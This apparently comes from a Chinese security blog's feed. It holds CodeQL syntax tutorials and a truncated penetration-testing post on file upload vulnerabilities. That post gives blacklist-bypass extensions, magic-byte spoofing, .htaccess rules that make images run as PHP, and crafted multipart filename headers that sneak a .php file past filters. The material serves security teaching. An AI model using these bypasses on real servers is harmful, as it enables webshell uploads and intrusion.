    <content type="html"><![CDATA[<h1 id="codeql语法–变量（Variables）"><a href="#codeql语法–变量（Variables）" class="headerlink" title="codeql语法–变量（Variables）"></a>codeql语法–变量（Variables）</h1><p>QL中的变量与代数或逻辑中的变量的使⽤⽅式相似。它们表示⼀组值，这些值通常受公式限制。<br>这与某些其他编程语⾔中的变量不同，在其他编程语⾔中，变量表示可能包含数据的内存位置。该数据还可以随着时间变化。例如，在QL中， <code>n = n + 1</code> 是⼀个等式公式，仅当 <code>n</code> 等于 <code>n + 1</code> 时才成⽴（因此，实际上它不适⽤于任何数值）。在Java中， <code>n = n + 1</code> 不是等式，⽽是通过添加 1 到当前的值 <code>n</code> ，并进⾏新的赋值来改变 <code>n</code> 代表的值。</p><p>所有变量声明均由变量的类型和名称组成。名称可以是任何 以⼤写或⼩写字⺟开头的标识符。例如，<code>int i</code>、 <code>SsaDefinitionNode node</code> 和 <code>LocalScopeVariable lsv</code> 声明变量 <code>i</code>、 <code>node</code> 和<code>lsv</code>，它们的类型分别为 <code>int</code>、 <code>SsaDefinitionNode</code>和 <code>LocalScopeVariable</code> 。变量声明出现在不同的上下⽂中，例如在select⼦句，量化公式内，作为谓词的参数等。从概念上讲，您可以将变量视为保留其类型允许的所有值，但要受到其他约束。例如，考虑以下select⼦句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">int</span> i<br><span class="hljs-keyword">where</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span> .. <span class="hljs-number">9</span>]<br><span class="hljs-keyword">select</span> i<br></code></pre></td></tr></table></figure><p>仅根据其类型，变量 <code>i</code> 可以包含所有整数。但是，它受公式 <code>i in [0 .. 9]</code> 约束。因此，select⼦句的结果是介于 0 到 9 之间的数字。</p><p>顺便说⼀句，请注意以下查询会导致编译时错误：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">int</span> i<br><span class="hljs-keyword">select</span> i<br></code></pre></td></tr></table></figure><p>从理论上讲，它将得到⽆穷多个结果，因为该变量不限 i 于有限数量的可能值。</p><h2 id="⾃由变量和约束变量"><a href="#⾃由变量和约束变量" class="headerlink" title="⾃由变量和约束变量"></a>⾃由变量和约束变量</h2><p>变量可以具有不同的作⽤。有些变量是free，它们的值直接影响使⽤它们的表达式的值，或者使⽤它们的公式是否 成⽴。其他变量（称为绑定变量）仅限于特定的值集。<br>在⼀个示例中，最容易理解这种区别。看⼀下以下表达式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">&quot;hello&quot;.indexOf(&quot;l&quot;)<br><br><span class="hljs-built_in">min</span>(<span class="hljs-type">float</span> f <span class="hljs-operator">|</span> f <span class="hljs-keyword">in</span> [<span class="hljs-number">-3</span> .. <span class="hljs-number">3</span>])<br><br>(i <span class="hljs-operator">+</span> <span class="hljs-number">7</span>) <span class="hljs-operator">*</span> <span class="hljs-number">3</span><br><br>x.<span class="hljs-built_in">sqrt</span>()<br></code></pre></td></tr></table></figure><p>第⼀个表达式没有任何变量。它找到 <code>&quot;l&quot;</code> 字符串中出现位置的（从零开始的）索引 <code>&quot;hello&quot;</code> ，因此它的<br>结果为 <code>2</code> 和 <code>3</code> 。</p><p>第⼆个表达式的计算结果为 <code>[-3 .. 3]</code> 范围内的最⼩值 <code>-3</code> 。尽管此表达式使⽤变量 <code>f</code> ，但它只是⼀个占位符或“虚拟”变量，您不能为其分配任何值。您可以使⽤其他变量替换 <code>f</code> ⽽⽆需更改表达式的含义。例如， <code>min(float f | f in [-3 .. 3])</code> 始终等于 <code>min(float other | other in [-3 .. 3])</code> 。这是<strong>绑定变量</strong>的示例。</p><p>表达式 <code>(i + 7) * 3</code> 和 <code>x.sqrt()</code>又该是怎样的呢 ？在这两种情况下，表达式的值取决于什么值赋值给变量。换句话说，变量的值对表达式的值有影响。这些是<strong>⾃由变量</strong>的示例。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-02-ql语言基本数据类型</title>
    <link href="/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-02-ql%E8%AF%AD%E8%A8%80%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/11/27/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-02-ql%E8%AF%AD%E8%A8%80%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql语法–ql语言基本数据类型"><a href="#codeql语法–ql语言基本数据类型" class="headerlink" title="codeql语法–ql语言基本数据类型"></a>codeql语法–ql语言基本数据类型</h1><p>QL语⾔中的基本数据类型，包括整型、浮点型、⽇期型、布尔型以及字符串类型。需要注意的是，对于QL语⾔来说，其⽀持的数据类型都带有相应的内建函数——通俗来说，就是系统已经为我们写好的函数，我们直接拿来就能⽤了。举例来说，如果我们想求⼀个整数的绝对值，直接调⽤内建函数abs()即可，例如-6.abs()。更⼀般地说，调⽤某种类型的变量的通⽤形式为：直接在变量后⾯加上⼀个点号，然后加上要调⽤的内建函数即可。同时，我们还可以通过点号将多个函数串联起来，也就是对变量连续进⾏多种处理，例如，对于⼀个整型变量a，先求绝对值，再开平⽅，我们可以将这个处理过程表示为：<code>a.abs().sqrt()</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">int</span> i<br><span class="hljs-keyword">where</span> i<span class="hljs-operator">=</span><span class="hljs-number">5</span><br><span class="hljs-keyword">select</span> i.<span class="hljs-built_in">abs</span>().<span class="hljs-built_in">sqrt</span>()<br></code></pre></td></tr></table></figure><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>字符串类型的变量⽤来存放以双引号开头和结尾的字符序列，即字符串。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> string s<br><span class="hljs-keyword">where</span> s <span class="hljs-operator">=</span> &quot;hello&quot;<br><span class="hljs-keyword">select</span> s<br></code></pre></td></tr></table></figure><p>其中，在from语句中，我们定义了⼀个字符串类型的变量s，然后，我们在where语句中，将字符串”hello”赋值给了变量s，最后，我们在select语句中返回变量s的值。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127163614761.png" alt="image-20221127163614761"></p><p>可以看到结果中并没有出现双引号。这是因为，双引号是⼀个特殊字符：字符串通常使⽤双引号”…”来表示开始和结束，所以双引号本身不会显示出来。读到这⾥，读者可能会问：如果字符串本身恰好包含⼀个”字符的话，那该怎么表示呢？这个时候，就该转义字符\上场了。具体来说，只要在双引号前⾯加上⼀个反斜杠，双引号就不再表示字符串的开始或结束位置的指示符，⽽是表示双引号⾃身了，具体如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> string s, string b<br><span class="hljs-keyword">where</span> s <span class="hljs-operator">=</span> &quot;hello&quot; <span class="hljs-keyword">and</span> b <span class="hljs-operator">=</span> &quot;hel\&quot;lo&quot;<br>select s, b<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127164047282.png" alt="image-20221127164047282"></p><h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><p>QL语⾔还为字符串类型提供了许多内置的函数，按照官⽅的说法，就是内置谓词，例如<code>charAt()</code>函数，该函数可以接收⼀个表示字符串下标的整型参数，并返回指定下标处的字符。准确来说，该函数的返回值的类型仍然是字符串类型，只不过只包含单个字符⽽已。请看下⾯的示例代码：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> string s, string b<br><span class="hljs-keyword">where</span> s <span class="hljs-operator">=</span> &quot;hello&quot; <span class="hljs-keyword">and</span> b <span class="hljs-operator">=</span> &quot;hel\&quot;lo&quot;<br>select s, b, s.charAt(0) as CharAt0<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127164424566.png" alt="image-20221127164424566"></p><h2 id="整型以及浮点型"><a href="#整型以及浮点型" class="headerlink" title="整型以及浮点型"></a>整型以及浮点型</h2><p>简单来说，整型变量⽤于保存整数，如306；⽽浮点型变量则⽤于保存浮点数，也就是带⼩数位的数，如3.14。例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">float</span> x, <span class="hljs-type">int</span> y<br><span class="hljs-keyword">where</span> x <span class="hljs-operator">=</span> <span class="hljs-number">3.6</span> <span class="hljs-keyword">and</span> y <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> x.pow(y), y.<span class="hljs-built_in">abs</span>().<span class="hljs-built_in">sqrt</span>(), x, y<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127165352688.png" alt="image-20221127165352688"></p><p>同样的，整型和浮点型也内建了许多函数，例如，abs()函数等，并且，它们的⼤部分函数的名称和作⽤都是相同的。</p><h2 id="日期型"><a href="#日期型" class="headerlink" title="日期型"></a>日期型</h2><p>⽇期型变量⽤于保存公历表示的时间值和⽇期值，如年、⽉、⽇、时、分、秒以及毫秒等，注意，它们的取值都是整数。其中，表示年的整数的取值范围是从-16777216到16777215，表示⽉的整数的取值范围为从0到11，表示⽇的整数的取值范围是从1到31，表示时的整数的取值范围是从0到23，表示分的整数的取值范围是从0到59，表示秒的整数的取值范围是从0到59，表示毫秒的整数的取值范围是从0到999。</p><p>查询2022年1月1日到2023年1月1日有多少天：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">date</span> <span class="hljs-keyword">start</span>, <span class="hljs-type">date</span> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">where</span> <span class="hljs-keyword">start</span> <span class="hljs-operator">=</span> &quot;01/01/2022&quot;.toDate() <span class="hljs-keyword">and</span> <span class="hljs-keyword">end</span> <span class="hljs-operator">=</span> &quot;01/01/2023&quot;.toDate()<br><span class="hljs-keyword">select</span> start.daysTo(<span class="hljs-keyword">end</span>)<br></code></pre></td></tr></table></figure><h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><p>布尔型变量⽤来存放布尔值，即false（假）或者 true（真）。为了便于读者理解，这⾥举例说明：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">boolean</span> b<br><span class="hljs-keyword">where</span> b <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> b.booleanNot()<br></code></pre></td></tr></table></figure><p>在上⾯的代码中，我们定义了⼀个布尔型变量b，并将其赋值为false，最后返回对变量b进⾏逻辑⾮操作后的值。</p><p>可以对布尔型变量b进⾏取反、以及and、or、Xor的逻辑运算，也可以将布尔型变量通过toString转换成String类型变量：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">from</span> <span class="hljs-type">boolean</span> b<br><span class="hljs-keyword">where</span> b <span class="hljs-operator">=</span> <span class="hljs-literal">false</span><br><span class="hljs-keyword">select</span> b.booleanNot(), b.booleanAnd(<span class="hljs-literal">true</span>), b.booleanOr(<span class="hljs-literal">true</span>), b.booleanXor(<span class="hljs-literal">true</span>), b.toString()<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221127170000305.png" alt="image-20221127170000305"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[代码审计] codeql语法-01-ql基础</title>
    <link href="/2022/11/26/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-01-ql%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/11/26/%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D%20codeql%E8%AF%AD%E6%B3%95-01-ql%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="codeql语法–ql基础"><a href="#codeql语法–ql基础" class="headerlink" title="codeql语法–ql基础"></a>codeql语法–ql基础</h1><p>QL是⼀种声明性的，⾯向对象的查询语⾔，经过优化可实现对分层数据结构（尤其是表示软件⼯件的数据库）的⾼效分析。</p><p>数据库是有组织的数据集合。最常⽤的数据库模型是将数据存储在表中的关系模型，⽽SQL（结构化查询语⾔）是关系数据库最常⽤的查询语⾔。</p><p>查询语⾔的⽬的是提供⼀个编程平台，您可以在其中询问有关存储在数据库中的信息的问题。数据库管理系统管理数据的存储和管理并提供查询机制。查询通常引⽤相关的数据库实体，并指定结果必须满⾜的各种条件（称为谓词）。查询评估涉及检查这些谓词并⽣成结果。好的查询语⾔及其实现的⼀些理想属性包括：</p><ul><li>声明性规范-声明性规范描述了结果必须满⾜的属性，⽽不是提供计算结果的过程。在数据库查询语⾔的上下⽂中，声明性规范抽象了基础数据库管理系统和查询处理技术的详细信息。这⼤⼤简化了查询编写。</li><li>富有表现力-强大的查询语⾔可让您编写复杂的查询。这使得该语⾔⼴泛适⽤。</li><li>⾼效的执⾏-查询可能很复杂，数据库可能⾮常庞⼤，因此对于查询语⾔实现⽽⾔，有效地处理和执⾏查询⾄关重要。</li></ul><h2 id="QL属性"><a href="#QL属性" class="headerlink" title="QL属性"></a>QL属性</h2><p>QL的语法类似于SQL，但是QL的语义基于Datalog，Datalog是⼀种声明性逻辑编程语⾔，通常⽤作查询语⾔。这使得QL主要是⼀种逻辑语⾔，并且QL中的所有操作都是逻辑操作。此外，QL从Datalog继承递归谓词，并增加了对聚合的⽀持，从⽽使复杂的查询也变得简洁明了。例如，考虑⼀个包含⼈与⽗⺟的亲⼦关系的数据库。如果我们想找到⼀个⼈的后代数量，通常我们将：</p><ul><li>查找给定⼈的后代，即⼀个孩⼦或⼀个孩⼦的后代。</li><li>计算使⽤上⼀步找到的后代的数量。</li></ul><p>当您在QL中编写此过程时，它与上述结构⾮常相似。请注意，我们使⽤递归来查找给定⼈员的所有后代，并使⽤总计来计算后代的数量。由于语⾔具有声明性，因此可以将这些步骤转换为最终查询⽽⽆需添加任何过程详细信息。QL代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs codeql">Person getADescendant(Person p) &#123;<br>result = p.getAChild() or<br>result = getADescendant(p.getAChild())<br>&#125;<br><br>int getNumberOfDescendants(Person p) &#123;<br>result = count(getADescendant(p))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="QL和面向对象"><a href="#QL和面向对象" class="headerlink" title="QL和面向对象"></a>QL和面向对象</h2><p>⾯向对象是QL的重要特征。⾯向对象的好处是众所周知的–它提⾼了模块性，实现了信息隐藏，并允许代码重⽤。QL在不损害其逻辑基础的情况下提供了所有这些好处。这是通过定义⼀个简单的对象模型实现的，其中将类建模为谓词，将继承建模为隐含。可⽤于所有受⽀持语⾔的库⼴泛使⽤了类和继承。</p><h2 id="QL和通用编程语言"><a href="#QL和通用编程语言" class="headerlink" title="QL和通用编程语言"></a>QL和通用编程语言</h2><p>这是通⽤编程语⾔和QL之间的⼀些突出的概念和功能差异： </p><ul><li>QL没有任何命令性功能，例如分配变量或⽂件系统操作。</li><li>QL对元组集合进⾏操作，并且查询可以视为定义查询结果的⼀组复杂的集合操作序列。 </li><li>QL基于集合的语义使处理值的集合变得很⾃然，⽽不必担⼼有效地存储，索引和遍历它们。 </li><li>在⾯向对象的编程语⾔中，实例化⼀个类涉及通过分配物理内存来保存该类实例状态的对象来创建对 象。在QL中，类只是描述已经存在的值的集合的逻辑属性。</li></ul>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>codeql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试] 文件上传</title>
    <link href="/2022/11/25/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2022/11/25/%5B%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%5D%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传通常需要结合免杀，上传的文件被其他人触发或者主动连接。这里主要介绍上传的方法。</p><h2 id="文件上传的危害"><a href="#文件上传的危害" class="headerlink" title="文件上传的危害"></a>文件上传的危害</h2><p>文件上传漏洞的危害：</p><ul><li><p>允许上传脚本语言文件且解析 &#x3D;&#x3D;&gt; getshell</p></li><li><p>允许上传html &#x3D;&#x3D;&gt; xss、csrf、登陆劫持…</p></li><li><p>允许上传压缩包 &#x3D;&#x3D;&gt; 压缩包DOS、解压文件getshell</p></li><li><p>允许上传pdf &#x3D;&#x3D;&gt; pdf xss</p></li><li><p>允许上传swf &#x3D;&#x3D;&gt; swf xss</p></li><li><p>允许上传excel、docx &#x3D;&#x3D;&gt; xxe</p></li><li><p>。。。</p></li></ul><p>不同文件类型可能导致的危害：</p><table><thead><tr><th>文件类型</th><th>危害</th></tr></thead><tbody><tr><td>asp, aspx, php</td><td>webshell, rce</td></tr><tr><td>svg</td><td>stored xss, ssrf, xxe</td></tr><tr><td>gif</td><td>stored xss, ssrf</td></tr><tr><td>csv</td><td>csv injection</td></tr><tr><td>xml</td><td>xxe</td></tr><tr><td>avi</td><td>lfi,ssrf</td></tr><tr><td>html, js</td><td>html injection, xss, open redirect</td></tr><tr><td>png</td><td>pixel flood attack, dos</td></tr><tr><td>zip</td><td>rce via lfi, dos</td></tr><tr><td>pdf</td><td>ssrf, blind xxe, Stored XSS</td></tr></tbody></table><h2 id="文件上传漏洞判断"><a href="#文件上传漏洞判断" class="headerlink" title="文件上传漏洞判断"></a>文件上传漏洞判断</h2><p>如何判断文件上传漏洞是否存在？首先上传正常的文件，确定能够上传的文件类型；然后上传恶意文件，判断过滤的规则，尝试不同的绕过方法。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/sum_up.png" alt="sum_up"></p><h2 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h2><p>一些文件上传的绕过方法，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/mind-map.png" alt="mind-map"></p><h3 id="一些语言可解析的后缀"><a href="#一些语言可解析的后缀" class="headerlink" title="一些语言可解析的后缀"></a>一些语言可解析的后缀</h3><table><thead><tr><th>语言</th><th>后缀</th></tr></thead><tbody><tr><td>asp&#x2F;aspx</td><td>asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</td></tr><tr><td>php</td><td>php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</td></tr><tr><td>jsp</td><td>jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</td></tr></tbody></table><h3 id="常见的Content-Type类型"><a href="#常见的Content-Type类型" class="headerlink" title="常见的Content-Type类型"></a>常见的Content-Type类型</h3><blockquote><p>[Http 常见 Content-Type 有哪些？_josavion的博客-CSDN博客_content-type mp3](<a href="https://blog.csdn.net/josavion/article/details/115260427#:~:text=Http">https://blog.csdn.net/josavion/article/details/115260427#:~:text=Http</a> 常见 Content-Type 有哪些？ 1 请求头–Request-Headers：一般我们在 post 请求中会向服务器发送一些参数，那我们就可以通过这个参数设置,text开头 text%2Fhtml： HTML格式 text%2Fplain：纯文本格式 text%2Fxml： XML格式 图片格式 )</p></blockquote><p>Content-type 定义了 http 请求的数据类型。</p><p>如果设置在请求头中，则定义的是请求体的数据类型；如果设置在响应头中，则定义的是响应体的数据类型；</p><ol><li>请求头–Request-Headers：一般我们在 post 请求中会向服务器发送一些参数，那我们就可以通过这个参数设置 post 的参数格式<ol><li>application&#x2F;json：JSON 数据格式；</li><li>application&#x2F;x-www-form-urlencoded：表单默认的提数据格式；</li><li>multipart&#x2F;form-data：一般用于文件上传；</li></ol></li><li>响应头–Response-Headers：响应头里的 Content-Type 参数会告诉我们响应数据的格式，一般我们可以在请求头里面设置我们想要的数据格式（Accept）；</li><li>以下是常见的Content-Type：<ol><li>text开头<ol><li>text&#x2F;html： HTML格式</li><li>text&#x2F;plain：纯文本格式</li><li>text&#x2F;xml： XML格式</li></ol></li><li>图片格式<ol><li>image&#x2F;gif ：gif 图片格式</li><li>image&#x2F;jpeg ：jpg 图片格式</li><li>image&#x2F;png：png 图片格式</li></ol></li><li>application开头<ol><li>application&#x2F;xhtml+xml：XHTML 格式</li><li>application&#x2F;xml：XML 数据格式</li><li>application&#x2F;atom+xml：Atom XML 聚合格式</li><li>application&#x2F;json：JSON 数据格式</li><li>application&#x2F;pdf：pdf 格式</li><li>application&#x2F;msword：Word 文档格式</li><li>application&#x2F;octet-stream：二进制流数据（如常见的文件下载）</li><li>application&#x2F;x-www-form-urlencoded：表单发送默认格式</li></ol></li><li>媒体文件<ol><li>audio&#x2F;x-wav：wav文件</li><li>audio&#x2F;x-ms-wma：w文件</li><li>audio&#x2F;mp3：mp3文件</li><li>video&#x2F;x-ms-wmv：wmv文件</li><li>video&#x2F;mpeg4：mp4文件</li><li>video&#x2F;avi：avi文件</li></ol></li></ol></li></ol><h3 id="常见文件头标识"><a href="#常见文件头标识" class="headerlink" title="常见文件头标识"></a>常见文件头标识</h3><p>文件幻数是用来唯一标识文件类型的一系列数字（十六进制），也就是常说的文件头，当白名单限制了文件幻数时，就要给文件制造可以通过检测的文件头即可：</p><table><thead><tr><th>文件类型</th><th>头标识</th><th>其他</th></tr></thead><tbody><tr><td>jpg</td><td>FF D8 FF E0</td><td></td></tr><tr><td>gif</td><td>47 49 46 38</td><td>GIF89a</td></tr><tr><td>png</td><td>89 50 4E 47</td><td></td></tr><tr><td>html</td><td>68 74 6D 6C 3E 10</td><td></td></tr><tr><td>xml</td><td>3C 3F 78 6D 6C</td><td></td></tr></tbody></table><h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;Aries.png&quot;</span>&gt;</span><br><span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span> <br></code></pre></td></tr></table></figure><p>将<code>Aries.png</code>文件作为PHP文件解析。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.jpg</span><br></code></pre></td></tr></table></figure><p>将php和jpg作为php文件解析。</p><p>需要注意如果重复上传，可能不会覆盖，而是生成副本：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.htaccess</span><br> - 副本<span class="hljs-string">.htaccess</span><br></code></pre></td></tr></table></figure><p>同样的对于指定的文件也可能不会覆盖，所以要一次上传好。</p><h3 id="白名单黑名单绕过"><a href="#白名单黑名单绕过" class="headerlink" title="白名单黑名单绕过"></a>白名单黑名单绕过</h3><p>在windows中如果限制了<code>1.php</code>文件，可以通过<code>1.php      </code>（后面又很多空格），或者使用<code>1.php.</code>保存后还是<code>1.php</code>文件。</p><p>如果发送请求为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;1.php&quot;</span><br></code></pre></td></tr></table></figure><p>可以尝试：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;1.jpg&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;1.php&quot;</span><br><br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=1.php<br><br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=upload_file; <span class="hljs-attribute">filename</span>=1.php<br><br>Content-Disposition: form-data; <span class="hljs-attribute">XXXXXXXXXXX</span>=YYYYYYYYYYYYY; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=1.php<br><br>将下面的整体作为文件名：<br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=upload_file; <span class="hljs-attribute">filename</span>=1.php<br>发送为：<br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;Content-Disposition: form-data; name=upload_file; filename=1.php&quot;</span><br><br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=<span class="hljs-string">&quot;aa\bb\&quot;123.php&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>或者尝试类似这种：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">image</span>/jpeg<br>Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">image</span>/jpeg<br>Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">image</span>/jpeg<br>Content-Disposition: form-data; <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;1.jpg&quot;</span>; filename=<span class="hljs-string">&quot;1.php&quot;</span><br>Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">image</span>/jpeg<br>Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">image</span>/jpeg<br></code></pre></td></tr></table></figure><p>通过fuzz尝试：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Content-Disposition: form-data; <span 